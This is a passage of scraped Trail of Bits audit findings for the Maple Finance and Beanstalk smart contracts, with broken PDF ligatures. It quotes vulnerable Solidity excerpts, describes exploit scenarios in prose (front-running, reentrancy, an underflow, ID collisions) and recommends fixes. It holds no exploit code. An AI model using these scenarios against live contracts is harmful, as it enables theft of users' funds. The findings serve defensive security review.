"Difficulty: High"]}, {"title": "1. Attackers can prevent lenders from funding or renancing loans ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf", "body": "For the MapleLoan contracts fundLoan method to fund a new loan, the balance of fundsAsset in the contract must be equal to the requested principal. // Amount funded and principal are as requested. amount_ = _principal = _principalRequested; // Cannot under/over fund loan, so that accounting works in context of PoolV1 require (_getUnaccountedAmount(_fundsAsset) == amount_, \"MLI:FL:WRONG_FUND_AMOUNT\" ); Figure 1.1: An excerpt of the fundLoan function ( contracts/MapleLoanInternals.sol#240244 ) An attacker could prevent a lender from funding a loan by making a small transfer of fundsAsset every time the lender tried to fund it (front-running the transaction). However, transaction fees would make the attack expensive. A similar issue exists in the Refinancer contract: If the terms of a loan were changed to increase the borrowed amount, an attacker could prevent a lender from accepting the new terms by making a small transfer of fundsAsset . The underlying call to increasePrincipal from within the acceptNewTerms function would then cause the transaction to revert. function increasePrincipal ( uint256 amount_ ) external override { require (_getUnaccountedAmount(_fundsAsset) == amount_, \"R:IP:WRONG_AMOUNT\" ); _principal += amount_; _principalRequested += amount_; _drawableFunds += amount_; emit PrincipalIncreased(amount_); 13 Maple Labs } Figure 1.2: The vulnerable method in the Refinancer contract ( contracts/Refinancer.sol#2330 ) Exploit Scenario A borrower tries to quickly increase the principal of a loan to take advantage of a short-term high-revenue opportunity. The borrower proposes new terms, and the lender tries to accept them. However, an attacker blocks the process and performs the protable operation himself. Recommendations Short term, allow the lender to withdraw funds in excess of the expected value (by calling getUnaccountedAmount(fundsAsset) ) before a loan is funded and between the proposal and acceptance of new terms. Alternatively, have fundLoan and increasePrincipal use greater-than-or-equal-to comparisons, rather than strict equality comparisons, to check whether enough tokens have been transferred to the contract; if there are excess tokens, use the same function to transfer them to the lender. Long term, avoid using exact comparisons for ether and token balances, as users can increase those balances by executing transfers, making the comparisons evaluate to false . 14 Maple Labs", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Reentrancies can lead to misordered events ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf", "body": "Several functions in the codebase do not use the checks-eects-interactions pattern, lack reentrancy guards, or emit events after interactions. These functions interact with external and third-party contracts that can execute callbacks and call the functions again (reentering them). The event for a reentrant call will be emitted before the event for the rst call, meaning that o-chain event monitors will observe incorrectly ordered events. function liquidatePortion ( uint256 swapAmount_ , bytes calldata data_) external override { ERC20Helper.transfer(collateralAsset, msg.sender , swapAmount_); msg.sender .call(data_); uint256 returnAmount = getExpectedAmount(swapAmount_); require (ERC20Helper.transferFrom(fundsAsset, msg.sender , destination, returnAmount), \"LIQ:LP:TRANSFER_FROM\" ); emit PortionLiquidated(swapAmount_, returnAmount); } Figure 2.1: The liquidatePortion function ( contracts/Liquidator.sol#4151 ) We identied this issue in the following functions:  DebtLocker  setAuctioneer  _handleClaim  _handleClaimOfReposessed  acceptNewTerms  Liquidator  liquidatePortion  pullFunds  MapleLoan 15 Maple Labs  acceptNewTerms  closeLoan  fundLoan  makePayment  postCollateral  returnFunds  skim  upgrade Exploit Scenario Alice calls Liquidator.liquidatePortion (gure 2.1). Since fundsAsset is an ERC777 token (or another token that allows callbacks), a callback function that Alice has registered on ERC20Helper.transfer is called. Alice calls Liquidator.liquidatePortion again from within that callback function. The event for the second liquidation is emitted before the event for the rst liquidation. As a result, the events observed by o-chain event monitors are incorrectly ordered. Recommendations Short term, follow the checks-eects-interactions pattern and ensure that all functions emit events before interacting with other contracts that may allow reentrancies. Long term, integrate Slither into the CI pipeline. Slither can detect low-severity reentrancies like those mentioned in this nding as well as high-severity reentrancies. Use reentrancy guards on all functions that interact with other contracts. 16 Maple Labs", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "3. Lack of two-step process for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf", "body": "The MapleLoan contracts setBorrower and setLender functions transfer the privileged borrower and lender roles to new addresses. If, because of a bug or a mistake, one of those functions is called with an address inaccessible to the Maple Labs team, the transferred role will be permanently inaccessible. It may be possible to restore access to the lender role by upgrading the loan contract to a new implementation. However, only the borrower can upgrade a loan contract, so no such bailout option exists for a transfer of the borrower role to an inaccessible address. Using a two-step process for role transfers would prevent such issues. Exploit Scenario Alice, the borrower of a Maple loan, notices that her borrower address key might have been compromised. To be safe, she calls MapleLoan.setBorrower with a new address. Because of a bug in the script that she uses to set the new borrower, the new borrower is set to an address for which Alice does not have the private key. As a result, she is no longer able to access her loan contract. Recommendations Short term, perform role transfers through a two-step process in which the borrower or lender proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, investigate whether implementing additional two-step processes could prevent any other accidental lockouts. 17 Maple Labs", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "4. IERC20Like.decimals returns non-standard uint256 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf", "body": "IERC20Like.decimal s declares uint256 as its return type, whereas the ERC20 standard species that it must return a uint8 . As a result, functions that use the IERC20Like interface interpret the values returned by decimals as uint256 values; this can cause values greater than 255 to enter the protocol, which could lead to undened behavior. If the return type were uint8 , only the last byte of the return value would be used. Exploit Scenario A non-standard token with a decimals function that returns values greater than 255 is integrated into the protocol. The code is not prepared to handle decimals values greater than 255. As a result of the large value, the arithmetic becomes unstable, enabling an attacker to drain funds from the protocol. Recommendations Short term, change the return type of IERC20.decimals to uint8 . Long term, ensure that all interactions with ERC20 tokens follow the standard. 18 Maple Labs", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "5. Transfers in Liquidator.liquidatePortion can fail silently ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf", "body": "Calls to ERC20Helper.transfer in the codebase are wrapped in require statements, except for the rst such call in the liquidatePortion function of the Liquidator contract (gure 5.1). As such, a token transfer executed through this call can fail silently, meaning that liquidatePortion can take a user's funds without providing any collateral in return. This contravenes the expected behavior of the function and the behavior outlined in the docstring of ILiquidator.liquidatePortion (gure 5.2). function liquidatePortion ( uint256 swapAmount_ , bytes calldata data_) external override { ERC20Helper.transfer (collateralAsset, msg.sender , swapAmount_); msg.sender .call(data_); uint256 returnAmount = getExpectedAmount(swapAmount_); require (ERC20Helper.transferFrom(fundsAsset, msg.sender , destination, returnAmount), \"LIQ:LP:TRANSFER_FROM\" ); emit PortionLiquidated(swapAmount_, returnAmount); } Figure 5.1: The liquidatePortion function ( contracts/Liquidator.sol#4151 ) * @dev Flash loan function that : * @dev 1 . Transfers a specified amount of `collateralAsset` to ` msg.sender `. * @dev 2 . Performs an arbitrary call to ` msg.sender `, to trigger logic necessary to get `fundsAsset` (e.g., AMM swap). * @dev 3 . Perfroms a `transferFrom`, taking the corresponding amount of `fundsAsset` from the user. * @dev If the required amount of `fundsAsset` is not returned in step 3 , the entire transaction reverts. * @param swapAmount_ Amount of `collateralAsset` that is to be borrowed in the flashloan. * @param data_ 2 . ABI-encoded arguments to be used in the low-level call to perform step 19 Maple Labs */ Figure 5.2: Docstring of liquidatePortion ( contracts/interfaces/ILiquidator.sol#7683 ) Exploit Scenario A loan is liquidated, and its liquidator contract has a collateral balance of 300 ether. The current ether price is 4,200 USDC. Alice wants to prot o of the liquidation by taking out a ash loan of 300 ether. Having checked that the contract holds enough collateral to cover the transaction, she calls liquidatePortion(1260000, ) in the liquidator contract. At the same time, Bob decides to buy 10 ether from the liquidator contract. Bob calls Liquidator.liquidatePortion(42000) . Because his transaction is mined rst, the liquidator does not have enough collateral to complete the transfer of collateral to Alice. As a result, the liquidator receives a transfer of 1,260,000 USDC from Alice but does not provide any ether in return, leaving her with a $1,260,000 loss. Recommendations Short term, wrap ERC20Helper.transfer in a require statement to ensure that a failed transfer causes the entire transaction to revert. Long term, ensure that a failed transfer of tokens to or from a user always causes the entire transaction to revert. To do that, follow the recommendations outlined in TOB-MAPLE-006 and have the ERC20Helper.transfer and ERC20Helper.transferFrom functions revert on a failure. Ensure that all functions behave as expected , that their behavior remains predictable when transactions are reordered, and that the code does not contain any footguns or surprises. 20 Maple Labs", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "6. ERC20Helpers functions do not revert on a failure ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf", "body": "The ERC20Helper contracts transfer , transferFrom , and approve functions do not revert on a failure. This makes it necessary for the developer to always check their return values. A failure to perform these checks can result in the introduction of high-severity bugs that can lead to a loss of funds. There are no uses of ERC20Helper.transfer for which not reverting on a failure is the best option. Making this standard behavior the default would make the code more robust and therefore more secure by default, as it would take less additional eort to make it secure. In the rare edge cases in which a transfer is allowed to fail or a failure status should be captured in a boolean, a try / catch statement can be used. Exploit Scenario Bob, a developer, writes a new function. He calls ERC20Helper.transfer but forgets to wrap the call in a require statement. As a result, token transfers can fail silently and lead to a loss of funds if that failure behavior is not accounted for. Recommendations Short term, have ERC20Helper.transfer , ERC20Helper.transferFrom , and ERC20Helper.approve revert on a failure. Long term, have all functions revert on a failure instead of returning false . Aim to make code secure by default so that less additional work will be required to make it secure. Additionally, whenever possible, avoid using optimizations that are detrimental to security. 21 Maple Labs", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "7. Lack of contract existence checks before low-level calls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf", "body": "The ERC20Helper contract lls a purpose similar to that of OpenZeppelin's SafeERC20 contract. However, while OpenZeppelin's SafeERC20 transfer and approve functions will revert when called on an address that is not a token contract address (i.e., one with zero-length bytecode), ERC20Helper s functions will appear to silently succeed without transferring or approving any tokens. If the address of an externally owned account (EOA) is used as a token address in the protocol, all transfers to it will appear to succeed without any tokens being transferred. This will result in undened behavior. Contract existence checks are usually performed via the EXTCODESIZE opcode. Since the EXTCODESIZE opcode would precede a CALL to a token address, adding EXTCODESIZE would make the CALL a warm access. As a result, adding the EXTCODESIZE check would increase the gas cost by only a little more than 100. Assuming a high gas price of 200 gwei and a current ether price of $4,200, that equates to an additional cost of 10 cents for each call to the functions of ERC20Helper , which is a low price to pay for increased security. The following functions lack contract existence checks:  ERC20Helper  call in _call  ProxyFactory  call in _initializeInstance  call in _upgradeInstance (line 66)  call in _upgradeInstance (line 72)  Proxied  delegatecall in _migrate  Proxy  delegatecall in _ fallback 22 Maple Labs  MapleLoanInternals  delegatecall in _acceptNewTerms Exploit Scenario A token contract is destroyed. However, since all transfers of the destroyed token will succeed, all Maple protocol users can transact as though they have an unlimited balance of that token. If contract existence checks were executed before those transfers, all transfers of the destroyed token would revert. Recommendations Short term, add a contract existence check before each of the low-level calls mentioned above. Long term, add contract existence checks before all low-level CALL s, DELEGATECALL s, and STATICCALL s. These checks are inexpensive and add an important layer of defense. 23 Maple Labs", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "8. Missing zero checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf", "body": "A number of constructors and functions in the codebase do not revert if zero is passed in for a parameter that should not be set to zero. The following parameters are not checked for the zero value:  Liquidator contract  constructor()  owner_  collateralAsset_  fundsAsset_  auctioneer_  destination_  setAuctioneer()  auctioneer_  MapleLoan contract  setBorrower()  borrower_  setLender()  lender_  MapleProxyFactory contract  constructor()  mapleGlobals_ If zero is passed in for one of those parameters, it will render the contract unusable, leaving its funds locked (and therefore eectively lost) and necessitating an expensive redeployment. For example, if there were a bug in the front end, MapleLoan.setBorrower could be called with address(0) , rendering the contract unusable and locking its funds in it. 24 Maple Labs The gas cost of checking a parameter for the zero value is negligible. Since the parameter is usually already on the stack, a zero check consists of a DUP opcode (3 gas) and an ISZERO opcode (3 gas). Given a high gas price of 200 gwei and an ether price of $4,200, a zero check would cost half a cent. Exploit Scenario A new version of the front end is deployed. A borrower suspects that the address currently used for his or her loan might have been compromised. As a precautionary measure, the borrower decides to transfer ownership of the loan to a new address. However, the new version of the front end contains a bug: the value of an uninitialized variable is used to construct the transaction. As a result, the borrower loses access to the loan contract, and to the collateral, forever. If zero checks had been in place, the transaction would have reverted instead. Recommendations Short term, add zero checks for the parameters mentioned above and for all other parameters for which zero is not an acceptable value. Long term, comprehensively validate all parameters. Avoid relying solely on the validation performed by front-end code, scripts, or other contracts, as a bug in any of those components could prevent it from performing that validation. Additionally, integrate Slither into the CI pipeline to automatically detect functions that lack zero checks. 25 Maple Labs", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "9. Lack of user-controlled limits for input amount in Liquidator.liquidatePortion ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf", "body": "The liquidatePortion function of the Liquidator contract computes the amount of funds that will be transferred from the caller to the liquidator contract. The computation uses an asset price retrieved from an oracle. There is no guarantee that the amount paid by the caller will correspond to the current market price, as a transaction that updates the price feed could be mined before the call to liquidatePortion in the liquidator contract. EOAs that call the function cannot predict the return value of the oracle. If the caller is a contract, though, it can check the return value, with some eort. Adding an upper limit to the amount paid by the caller would enable the caller to explicitly state his or her assumptions about the execution of the contract and to avoid paying too much. It would also provide additional protection against the misreporting of oracle prices. Since such a scenario is unlikely, we set the diculty level of this nding to high. Using caller-controlled limits for the amount of a transfer is a best practice commonly employed by large DeFi protocols such as Uniswap. Exploit Scenario Alice calls liquidatePortion in the liquidator contract. Due to an oracle malfunction, the amount of her transfer to the liquidator contract is much higher than the amount she would pay for the collateral on another market. Recommendations Short term, introduce a maxReturnAmount parameter and add a require statement require(returnAmount <= maxReturnAmount) to enforce that parameter. 26 Maple Labs Long term, always allow the caller to control the amount of a transfer. This is especially important for transfer amounts that depend on factors that can change between transactions. Enable the caller to add a lower limit for a transfer from a contract and an upper limit for a transfer of the callers funds to a contract. 27 Maple Labs A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "1. Attackers could mint more Fertilizer than intended due to an unused variable ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "Due to an unused local variable, an attacker could mint more Fertilizer than should be allowed by the sale. The mintFertilizer() function checks that the _amount variable is no greater than the remaining variable; this ensures that more Fertilizer than intended cannot be minted; however, the _amount variable is not used in subsequent function callsinstead, the amount variable is used; the code eectively skips this check, allowing users to mint more Fertilizer than required to recapitalize the protocol. function mintFertilizer ( uint128 amount , uint256 minLP , LibTransfer.From mode ) external payable { uint256 remaining = LibFertilizer.remainingRecapitalization(); uint256 _amount = uint256 (amount); if (_amount > remaining) _amount = remaining; LibTransfer.receiveToken( C.usdc(), uint256 ( amount ).mul(1e6), msg.sender , mode ); uint128 id = LibFertilizer.addFertilizer( uint128 (s.season.current), amount , minLP ); C.fertilizer().beanstalkMint( msg.sender , uint256 (id), amount , s.bpf); } Figure 1.1: The mintFertilizer() function in FertilizerFacet.sol#L35- Note that this aw can be exploited only once: if users mint more Fertilizer than intended, the remainingRecapitalization() function returns 0 because the dollarPerUnripeLP() and unripeLP() . totalSupply() variables are constants. function remainingRecapitalization() internal view returns (uint256 remaining) { } AppStorage storage s = LibAppStorage.diamondStorage(); uint256 totalDollars = C .dollarPerUnripeLP() .mul(C.unripeLP().totalSupply()) .div(DECIMALS); if (s.recapitalized >= totalDollars) return 0; return totalDollars.sub(s.recapitalized); Figure 1.2: The remainingRecapitalization() function in LibFertilizer.sol#L132-145 Exploit Scenario Recapitalization of the Beanstalk protocol is almost complete; only 100 units of Fertilizer for sale remain. Eve, a malicious user, calls mintFertilizer() with an amount of 10 million, signicantly over-funding the system. Because the Fertilizer supply increased signicantly above the theoretical maximum, other users are entitled to a much smaller yield than expected. Recommendations Short term, use _amount instead of amount as the parameter in the functions that are called after mintFertilizer() . Long term, thoroughly document the expected behavior of the FertilizerFacet contract and the properties (invariants) it should enforce, such as token amounts above the maximum recapitalization threshold cannot be sold. Expand the unit test suite to test that these properties hold.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "2. Lack of a two-step process for ownership transfer ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "The transferOwnership() function is used to change the owner of the Beanstalk protocol. This function calls the setContractOwner() function, which immediately sets the contracts new owner. Transferring ownership in one function call is error-prone and could result in irrevocable mistakes. function transferOwnership ( address _newOwner ) external override { LibDiamond.enforceIsContractOwner(); LibDiamond.setContractOwner(_newOwner); } Figure 2.1: The transferOwnership() function in OwnershipFacet.sol#L13-16 Exploit Scenario The owner of the Beanstalk contracts is a community controlled multisignature wallet. The community agrees to upgrade to an on-chain voting system, but the wrong address is mistakenly provided to its call to transferOwnership() , permanently misconguring the system. Recommendations Short term, implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Possible underow could allow more Fertilizer than MAX_RAISE to be minted ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "The remaining() function could underow, which could allow the Barn Raise to continue indenitely. Fertilizer is an ERC1155 token issued for participation in the Barn Raise, a community fundraiser intended to recapitalize the Beanstalk protocol with Bean and liquidity provider (LP) tokens that were stolen during the April 2022 governance hack. Fertilizer entitles holders to a pro rata portion of one-third of minted Bean tokens if the Fertilizer token is active, and it can be minted as long as the recapitalization target ($77 million) has not been reached. Users who want to buy Fertilizer call the mint() function and provide one USDC for each Fertilizer token they want to mint. function mint(uint256 amount) external payable nonReentrant { uint256 r = remaining(); if (amount > r) amount = r; __mint(amount); IUSDC.transferFrom(msg.sender, CUSTODIAN, amount); } Figure 3.1: The mint() function in FertilizerPremint.sol#L51-56 The mint() function rst checks how many Fertilizer tokens remain to be minted by calling the remaining() function (gure 3.2); if the user is trying to mint more Fertilizer than available, the mint() function mints all of the Fertilizer tokens that remain. function remaining() public view returns (uint256) { return MAX_RAISE - IUSDC.balanceOf(CUSTODIAN); } Figure 3.2: The remaining() function in FertilizerPremint.sol#L84- However, the FertilizerPremint contract does not use Solidity 0.8, so it does not have native overow and underow protection. As a result, if the amount of Fertilizer purchased reaches MAX_RAISE (i.e., 77 million), an attacker could simply send one USDC to the CUSTODIAN wallet to cause the remaining() function to underow, allowing the sale to continue indenitely. In this particular case, Beanstalk protocol funds are not at risk because all the USDC used to purchase Fertilizer tokens is sent to a Beanstalk community-owned multisignature wallet; however, users who buy Fertilizer after such an exploit would lose the gas funds they spent, and the project would incur further reputational damage. Exploit Scenario The Barn Raise is a total success: the MAX_RAISE amount is hit, meaning that 77 million Fertilizer tokens have been minted. Alice, a malicious user, notices the underow risk in the remaining() function; she sends one USDC to the CUSTODIAN wallet, triggering the underow and causing the function to return the maxuint256 instead of MAX_RAISE . As a result, the sale continues even though the MAX_RAISE amount was reached. Other users, not knowing that the Barn Raise should be complete, continue to successfully mint Fertilizer tokens until the bug is discovered and the system is paused to address the issue. While no Beanstalk funds are lost as a result of this exploit, the users who continued minting Fertilizer after the MAX_RAISE was reached lose all the gas funds they spent. Recommendations Short term, add a check in the remaining() function so that it returns 0 if USDC.balanceOf(CUSTODIAN) is greater than or equal to MAX_RAISE . This will prevent the underow from being triggered. Because the function depends on the CUSTODIAN s balance, it is still possible for someone to send USDC directly to the CUSTODIAN wallet and reduce the amount of available Fertilizer; however, attackers would lose their money in the process, meaning that there are no incentives to perform this kind of action. Long term, thoroughly document the expected behavior of the FertilizerPremint contract and the properties (invariants) it should enforce, such as no tokens can be minted once the MAX_RAISE is reached. Expand the unit test suite to test that these properties hold.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "4. Risk of Fertilizer id collision that could result in loss of funds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "If a user mints Fertilizer tokens twice during two dierent seasons, the same token id for both tokens could be calculated, and the rst entry will be overridden; if this occurs and the bpf value changes, the user would be entitled to less yield than expected. To mint new Fertilizer tokens, users call the mintFertilizer() function in the FertilizerFacet contract. An id is calculated for each new Fertilizer token that is minted; not only is this id an identier for the token, but it also represents the endBpf period, which is the moment at which the Fertilizer reaches maturity and can be redeemed without incurring any penalty. function mintFertilizer( uint128 amount, uint256 minLP, LibTransfer.From mode ) external payable { uint256 remaining = LibFertilizer.remainingRecapitalization(); uint256 _amount = uint256(amount); if (_amount > remaining) _amount = remaining; LibTransfer.receiveToken( C.usdc(), uint256(amount).mul(1e6), msg.sender, mode ); uint128 id = LibFertilizer.addFertilizer( uint128(s.season.current), amount, minLP ); C.fertilizer().beanstalkMint(msg.sender, uint256(id), amount, s.bpf); } Figure 4.1: The mintFertilizer() function in Fertilizer.sol#L35-55 The id is calculated by the addFertilizer() function in the LibFertilizer library as the sum of 1 and the bpf and humidity values. function addFertilizer( uint128 season, uint128 amount, uint256 minLP ) internal returns (uint128 id) { AppStorage storage s = LibAppStorage.diamondStorage(); uint256 _amount = uint256(amount); // Calculate Beans Per Fertilizer and add to total owed uint128 bpf = getBpf(season); s.unfertilizedIndex = s.unfertilizedIndex.add( _amount.mul(uint128(bpf)) ); // Get id id = s.bpf.add(bpf); [...] } function getBpf(uint128 id) internal pure returns (uint128 bpf) { bpf = getHumidity(id).add(1000).mul(PADDING); } function getHumidity(uint128 id) internal pure returns (uint128 humidity) { if (id == REPLANT_SEASON) return 5000; if (id >= END_DECREASE_SEASON) return 200; uint128 humidityDecrease = id.sub(REPLANT_SEASON + 1).mul(5); humidity = RESTART_HUMIDITY.sub(humidityDecrease); } Figure 4.2: The id calculation in LibFertilizer.sol#L32-67 However, the method that generates these token id s does not prevent collisions. The bpf value is always increasing (or does not move), and humidity decreases every season until it reaches 20%. This makes it possible for a user to mint two tokens in two dierent seasons with dierent bpf and humidity values and still get the same token id . function beanstalkMint(address account, uint256 id, uint128 amount, uint128 bpf) external onlyOwner { _balances[id][account].lastBpf = bpf; _safeMint( account, id, amount, bytes('0') ); } Figure 4.3: The beanstalkMint() function in Fertilizer.sol#L40-48 An id collision is not necessarily a problem; however, when a token is minted, the value of the lastBpf eld is set to the bpf of the current season, as shown in gure 4.3. This eld is very important because it is used to determine the penalty, if any, that a user will incur when redeeming Fertilizer. To redeem Fertilizer, users call the claimFertilizer() function, which in turn calls the beanstalkUpdate() function on the Fertilizer contract. function claimFertilized(uint256[] calldata ids, LibTransfer.To mode) external payable { } uint256 amount = C.fertilizer().beanstalkUpdate(msg.sender, ids, s.bpf); LibTransfer.sendToken(C.bean(), amount, msg.sender, mode); Figure 4.4: The claimFertilizer() function in FertilizerFacet.sol#L27-33 function beanstalkUpdate( address account, uint256[] memory ids, uint128 bpf ) external onlyOwner returns (uint256) { return __update(account, ids, uint256(bpf)); } function __update( address account, uint256[] memory ids, uint256 bpf ) internal returns (uint256 beans) { for (uint256 i = 0; i < ids.length; i++) { uint256 stopBpf = bpf < ids[i] ? bpf : ids[i]; uint256 deltaBpf = stopBpf - _balances[ids[i]][account].lastBpf; if (deltaBpf > 0) { beans = beans.add(deltaBpf.mul(_balances[ids[i]][account].amount)); _balances[ids[i]][account].lastBpf = uint128(stopBpf); } } emit ClaimFertilizer(ids, beans); } Figure 4.5: The update ow in Fertilizer.sol#L32-38 and L72-86 The beanstalkUpdate() function then calls the __update() function. This function rst calculates the stopBpf value, which is one of two possible values. If the Fertilizer is being redeemed early, stopBpf is the bpf at which the Fertilizer is being redeemed; if the token is being redeemed at maturity or later, stopBpf is the token id (i.e., the endBpf value). Afterward, __update() calculates the deltaBpf value, which is used to determine the penalty, if any, that the user will incur when redeeming the token; deltaBpf is calculated using the stopBpf value that was already dened and the lastBpf value, which is the bpf corresponding to the last time the token was redeemed or, if it was never redeemed, the bpf at the moment the token was minted. Finally, the tokens lastBpf eld is updated to the stopBpf . Because of the id collision, users could accidentally mint Fertilizer tokens with the same id in two dierent seasons and override their rst mints lastBpf eld, ultimately reducing the amount of yield they are entitled to. Exploit Scenario Imagine the following scenario:   It is currently the rst season; the bpf is 0 and the humidity is 40%. Alice mints 100 Fertilizer tokens with an id of 41 (the sum of 1 and the bpf ( 0 ) and humidity ( 40 ) values), and lastBpf is set to 0 . Some time goes by, and it is now the third season; the bpf is 35 and the humidity is 5%. Alice mints one additional Fertilizer token with an id of 41 (the sum of 1 and the bpf ( 35 ) and humidity ( 5 ) values), and lastBpf is set to 35 . Because of the second mint, the lastBpf eld of Alices Fertilizer tokens is overridden, making her lose a substantial amount of the yield she was entitled to:  Using the formula for calculating the number of BEAN tokens that users are entitled to, shown in gure 4.5, Alices original yield at maturity would have been 4,100 tokens:  deltaBpf = id - lastBpf = 41 - 0 = 41  balance = 100  beans received = deltaBpf * balance = 41 * 100 = 4100  As a result of the overridden lastBpf eld, Alices yield instead ends up being only 606 tokens:  deltaBpf = id - lastBpf = 41 - 35 = 6  balance = 101  beans received = deltaBpf * balance = 6 * 101 = 606 Recommendations Short term, separate the role of the id into two separate variables for the token index and endBpf . That way, the index can be optimized to prevent collisions, while endBpf can accurately represent the data it needs to represent. Alternatively, modify the relevant code so that when an id collision occurs, it either reverts or redeems the previous Fertilizer rst before minting the new tokens. However, these alternate remedies could introduce new edge cases or could result in a degraded user experience; if either alternate remedy is implemented, it would need to be thoroughly documented to inform the users of its particular behavior. Long term, thoroughly document the expected behavior of the associated code and include regression tests to prevent similar issues from being introduced in the future. Additionally, exercise caution when using one variable to serve two purposes. Gas savings should be measured and weighed against the increased complexity. Developers should be aware that performing optimizations could introduce new edge cases and increase the codes complexity.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "5. The sunrise() function rewards callers only with the base incentive ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "The increasing incentive that encourages users to call the sunrise() function in a timely manner is not actually applied. According to the Beanstalk white paper, the reward paid to users who call the sunrise() function should increase by 1% every second (for up to 300 seconds) after this method is eligible to be called; this incentive is designed so that, even when gas prices are high, the system can move on to the next season in a timely manner. This increasing incentive is calculated and included in the emitted logs, but it is not actually applied to the number of Bean tokens rewarded to users who call sunrise() . function incentivize ( address account , uint256 amount ) private { uint256 timestamp = block.timestamp .sub( s.season.start.add(s.season.period.mul(season())) ); if (timestamp > 300 ) timestamp = 300 ; uint256 incentive = LibIncentive.fracExp(amount, 100 , timestamp, 1 ); C.bean().mint(account, amount ); emit Incentivization(account, incentive ); } Figure 5.1: The incentive calculation in SeasonFacet.sol#70-78 Exploit Scenario Gas prices suddenly increase to the point that it is no longer protable to call sunrise() . Given the lack of an increasing incentive, the function goes uncalled for several hours, preventing the system from reacting to changing market conditions. Recommendations Short term, pass the incentive value instead of amount into the mint() function call. Long term, thoroughly document the expected behavior of the SeasonFacet contract and the properties (invariants) it should enforce, such as the caller of the sunrise() function receives the right incentive. Expand the unit test suite to test that these properties hold. Additionally, thoroughly document how the system would be aected if the sunrise() function were not called for a long period of time (e.g., in times of extreme network congestion). Finally, determine whether the Beanstalk team should rely exclusively on third parties to call the sunrise() function or whether an alternate system managed by the Beanstalk team should be adopted in addition to the current system. For example, an alternate system could involve an o-chain monitoring system and a trusted execution ow.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "6. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "Beanstalk has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Beanstalk contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "7. Lack of support for external transfers of nonstandard ERC20 tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "For external transfers of nonstandard ERC20 tokens via the TokenFacet contract, the code uses the standard transferFrom operation from the given token contract without checking the operations returndata ; as a result, successfully executed transactions that fail to transfer tokens will go unnoticed, causing confusion in users who believe their funds were successfully transferred. The TokenFacet contract exposes transferToken() , an external function that users can call to transfer ERC20 tokens both to and from the contract and between users. function transferToken( IERC20 token, address recipient, uint256 amount, LibTransfer.From fromMode, LibTransfer.To toMode ) external payable { LibTransfer.transferToken(token, recipient, amount, fromMode, toMode); } Figure 7.1: The transferToken() function in TokenFacet.sol#L39-47 This function calls the LibTransfer library, which handles the token transfer. function transferToken( IERC20 token, address recipient, uint256 amount, From fromMode, To toMode ) internal returns (uint256 transferredAmount) { if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) { token.transferFrom(msg.sender, recipient, amount); return amount; } amount = receiveToken(token, amount, msg.sender, fromMode); sendToken(token, amount, recipient, toMode); return amount; } 